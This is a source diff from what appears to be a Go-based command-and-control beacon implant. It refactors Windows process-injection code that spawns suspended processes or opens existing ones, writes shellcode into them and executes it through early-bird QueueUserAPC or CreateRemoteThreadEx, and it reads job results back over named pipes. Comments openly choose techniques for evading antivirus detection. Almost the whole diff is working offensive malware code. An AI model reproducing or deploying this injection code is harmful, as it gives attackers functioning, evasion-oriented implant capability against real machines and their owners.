@@ -51,28 +51,27 @@ var jobCnt = 0
 // spawn and inject get thread/process id, but we need it in handleJob
 var currentPid uint32 = 0
 
-func removeJob(jid int) {
-	for i, job := range jobs {
-		if job.jid == jid {
-			jobs = append(jobs[:i], jobs[i+1:]...)
-		}
-	}
-}
-
 // implement of beacon.Job
 
 // inject command specify a pid to inject, so it seems no need to adjust whether it is x86 or x64
 // TODO still didn't work
-func InjectDll(b []byte) error {
-	pid, dll, err := parseInject(b)
+func InjectDll(b []byte, isDllX64 bool) error {
+	pid, dll, offset, err := parseInject(b)
+	var isProcessX64 = true
+	if sysinfo.GetProcessArch(pid) != sysinfo.ProcessArch64 {
+		isProcessX64 = false
+	}
+	if isDllX64 != isProcessX64 {
+		return errors.New("dll and process arch didn't equal")
+	}
+	// TODO check if pid is self
 	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
 	if err != nil {
-		// if you don't put a value into channel will cause blocking in handle job
 		currentPid = 0
 		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
 	}
 	currentPid = pid
-	//return createRemoteThread(processHandle, dll)
+	//return createRemoteThread(processHandle, dll, 0, nil)
 
 	// callUserAPC deploy
 	threadIds := listThread(pid)
@@ -84,7 +83,7 @@ func InjectDll(b []byte) error {
 	}
 	defer windows.CloseHandle(threadHandle)
 	defer windows.CloseHandle(processHandle)
-	return callUserAPC(processHandle, threadHandle, dll)
+	return callUserAPC(processHandle, threadHandle, dll, offset)
 }
 
 func listThread(pid uint32) []uint32 {
@@ -142,48 +141,43 @@ func getSpawnProcessX64() (string, string) {
 	return program, args
 }
 
-func SpawnAndInjectDllX64(dll []byte) error {
-	program, args := getSpawnProcessX64()
-	err := spawnAndInjectDll(dll, program, args)
-	if err != nil {
-		return err
+func spawnTempProcess(procInfo *windows.ProcessInformation, startupInfo *windows.StartupInfo, isX64 bool, ignoreToken bool) error {
+	var program, args string
+	if isX64 {
+		program, args = getSpawnProcessX64()
+	} else {
+		program, args = getSpawnProcessX86()
+	}
+
+	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo, ignoreToken)
+	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
+		currentPid = 0
+		return errors.New(fmt.Sprintf("CreateProcess error: %s", errCreateProcess.Error()))
 	}
 	return nil
 }
 
-func SpawnAndInjectDllX86(dll []byte) error {
-	program, args := getSpawnProcessX86()
-	err := spawnAndInjectDll(dll, program, args)
-	if err != nil {
-		return err
-	}
-	return nil
-}
-
-func spawnAndInjectDll(dll []byte, program string, args string) error {
+func SpawnAndInjectDll(dll []byte, isDllX64 bool, ignoreToken bool) error {
 	procInfo := &windows.ProcessInformation{}
 	startupInfo := &windows.StartupInfo{
 		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
 		ShowWindow: 1,
 	}
-	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
-	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
+	err := spawnTempProcess(procInfo, startupInfo, isDllX64, ignoreToken)
+	if err != nil {
 		currentPid = 0
-		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
+		return err
 	}
 	currentPid = procInfo.ProcessId
-	// kill spawn will kill process, so threadId is useless
 	defer windows.CloseHandle(procInfo.Process)
 	defer windows.CloseHandle(procInfo.Thread)
-	return callUserAPC(procInfo.Process, procInfo.Thread, dll)
-
+	return callUserAPC(procInfo.Process, procInfo.Thread, dll, 0)
 	// createRemoteThread can be easily caught, you should never use it
-	//processHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, procInfo.ProcessId)
-	//return createRemoteThread(processHandle, dll)
+	//return createRemoteThread(procInfo.Process, dll, 0, nil)
 }
 
 // copy from GolangBypassAV EarlyBird
-func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shellcode []byte) error {
+func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shellcode []byte, offset uint32) error {
 	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
@@ -199,7 +193,8 @@ func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shel
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
 	}
-	_, _, err := queueUserAPC.Call(addr, uintptr(threadHandle), 0)
+	// TODO ptr plus
+	_, _, err := queueUserAPC.Call(addr+uintptr(offset), uintptr(threadHandle), 0)
 	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
 	}
@@ -210,7 +205,27 @@ func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shel
 	return nil
 }
 
-func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
+func createRemoteThread(processHandle windows.Handle, shellcode []byte, offset uint32, args []byte) error {
+	var argsAddr uintptr = 0
+	if args != nil {
+		var errVirtualAlloc error
+		argsAddr, _, errVirtualAlloc = virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(args)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
+		if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
+			return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
+		}
+
+		if argsAddr == 0 {
+			return errors.New("[!]VirtualAllocEx failed and returned 0")
+		}
+		var writtenBytes uintptr
+		errWriteProcessMemory := windows.WriteProcessMemory(processHandle, argsAddr, &args[0], uintptr(len(args)), &writtenBytes)
+
+		if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
+			return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
+		}
+	}
+
 	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
 
 	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
@@ -232,26 +247,21 @@ func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
 	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
 	}
-	var threadId uint32
-	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, uintptr(threadId))
+	// offset is the shellcode prepends in c2profile
+	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr+uintptr(offset), argsAddr, 0, 0)
 	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
 		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
 	}
-	_ = windows.CloseHandle(processHandle)
 	return nil
 }
 
 func HandlerJobAsync(b []byte) error {
 	buf := bytes.NewBuffer(b)
 	// inject it gives pid, spawn it gives zero
-	pidByte := make([]byte, 4)
-	callbackTypeByte := make([]byte, 2)
-	sleepTimeByte := make([]byte, 2)
-	_, _ = buf.Read(pidByte)
-	_, _ = buf.Read(callbackTypeByte)
-	_, _ = buf.Read(sleepTimeByte)
-	callbackType := packet.ReadShort(callbackTypeByte)
-	sleepTime := packet.ReadShort(sleepTimeByte)
+	// pid
+	_ = packet.ReadInt(buf)
+	callbackType := packet.ReadShort(buf)
+	sleepTime := packet.ReadShort(buf)
 	pipeName, _ := parseAnArg(buf)
 	commandType, _ := parseAnArg(buf)
 	if currentPid == 0 {
@@ -301,7 +311,8 @@ func ListJobs() error {
 }
 
 func KillJob(b []byte) error {
-	jid := packet.ReadShort(b)
+	buf := bytes.NewBuffer(b)
+	jid := packet.ReadShort(buf)
 	for _, j := range jobs {
 		if j.jid == int(jid) {
 			// don't kill the process, just disconnect the pipe
@@ -311,11 +322,20 @@ func KillJob(b []byte) error {
 	return nil
 }
 
+func removeJob(jid int) {
+	for i, job := range jobs {
+		if job.jid == jid {
+			jobs = append(jobs[:i], jobs[i+1:]...)
+			return
+		}
+	}
+}
+
 func readNamedPipe(j job) (string, error) {
 	pipe, err := winio.DialPipe(j.pipeName, nil)
 	if err != nil {
 		// try it twice in case of sleep time is too short
-		time.Sleep(time.Second * 5)
+		time.Sleep(time.Millisecond * time.Duration(j.sleepTime))
 		pipe, err = winio.DialPipe(j.pipeName, nil)
 		if err != nil {
 			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
@@ -323,9 +343,8 @@ func readNamedPipe(j job) (string, error) {
 	}
 	defer pipe.Close()
 	result := ""
-	buf := make([]byte, 512)
+	buf := make([]byte, 1024)
 	for {
-		time.Sleep(time.Millisecond * time.Duration(j.sleepTime))
 		select {
 		case <-j.stopCh:
 			return result + fmt.Sprintf("\njob %d canceled", j.jid), nil
